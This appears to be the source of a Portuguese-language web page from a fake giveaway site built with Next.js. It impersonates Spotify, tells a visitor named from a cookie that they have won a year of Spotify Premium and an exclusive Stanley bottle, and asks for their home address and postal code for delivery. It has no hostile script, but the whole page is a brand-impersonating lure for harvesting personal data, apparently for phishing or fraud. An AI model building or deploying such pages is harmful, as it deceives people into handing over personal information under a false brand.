import Logo from '@/assets/logo-green.png'
import { Headphones, Milk, PlusIcon } from 'lucide-react'
import { cookies } from 'next/headers'
import Image from 'next/image'
export default function GiftPage() {

  const name = cookies().get('user_name')
  const email = cookies().get('user_email')


  return (
    <div className="w-full relative min-h-screen bg-[#181818] text-white">
      <div className='w-full p-5 min-h-screen flex items-center justify-center'>
        <div className='w-full bg-black rounded-lg p-5 space-y-8'>
          <div className='w-full flex items-center justify-center'>
            <Image src={Logo} className='object-contain' width={100} height={30} alt='logo' priority />
          </div>

          <p className='text-white font-semibold text-lg text-center'>
            {name?.value}, como forma de gratidão pelo seu tempo em ajudar o <span className="text-[#01d661]">Spotify</span> uma plataforma acessível e o melhor streaming de músicas no mundo, gostariamos de te mimar com alguns presentes.
          </p>

          <div className='w-full flex flex-col items-center justify-center gap-4'>
            <div className='flex flex-col items-center'>
              <div className='flex items-center'>
                <Headphones className='size-5 mr-2 text-[#01d661]' />
                <h3 className='text-[#01d661] font-bold'>Spotify Premium por 1 Ano</h3>
              </div>
              <p className='text-[#a8a8a8] text-sm text-center'>Usando e-mail: {email?.value}</p>
            </div>


            <PlusIcon className='text-[#01d661] size-10' />

            <div className='flex flex-col items-center'>
              <div className='flex items-center'>
                <Milk className='size-5 rotate-45 mr-2 text-[#01d661]' />
                <h3 className='text-[#01d661] font-bold text-center'>Garrafa Stanley Exclusiva</h3>
              </div>
              <h3 className='text-[#01d661] font-bold text-center'>Edição Spotify Premium Listener</h3>
            </div>
          </div>


          <div></div>




          <div className='space-y-4'>
            <p>Endereço para entregar:</p>


            <input
              type="text"
              placeholder="Digite seu endereço"
              className="h-12 bg-[#181818] rounded-lg ring-2 ring-[#A8A8A8] w-full px-4 text-[#A8A8A8] border-none outline-none"
            />

            <input
              type="text"
              placeholder="Bairro"
              className="h-12 bg-[#181818] rounded-lg ring-2 ring-[#A8A8A8] w-full px-4 text-[#A8A8A8] border-none outline-none"
            />

            <input
              type="number"
              placeholder="Número"
              className="h-12 bg-[#181818] rounded-lg ring-2 ring-[#A8A8A8] w-full px-4 text-[#A8A8A8] border-none outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
            />



            <input
              type="number"
              placeholder="CEP"
              className="h-12 bg-[#181818] rounded-lg ring-2 ring-[#A8A8A8] w-full px-4 text-[#A8A8A8] border-none outline-none [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
            />

            <div>
              <p className='text-center text-[#a8a8a8] text-sm'>
                Prazo de entrega dos mimos são de 7 a 15 dias.
              </p>
              <p className='text-center text-[#a8a8a8] text-sm'>
                Entregue por: Correios
              </p>
            </div>

            <div>
              <button type='submit' className="w-full mt-10 bg-[#01D661] rounded-3xl h-12 font-bold flex items-center justify-center">
                CONTINUAR & RECEBER
              </button>
            </div>
          </div>





          <p className="text-center text-[#a8a8a8] pt-10">
            Este site é protegido pelo reCAPTCHA e está sujeito à <b className="text-[#01d661]">Política de Privacidade</b> e aos <b className="text-[#01d661]">Termos de Serviço do Google.</b>
          </p>

        </div>
      </div>
    </div>
  )
}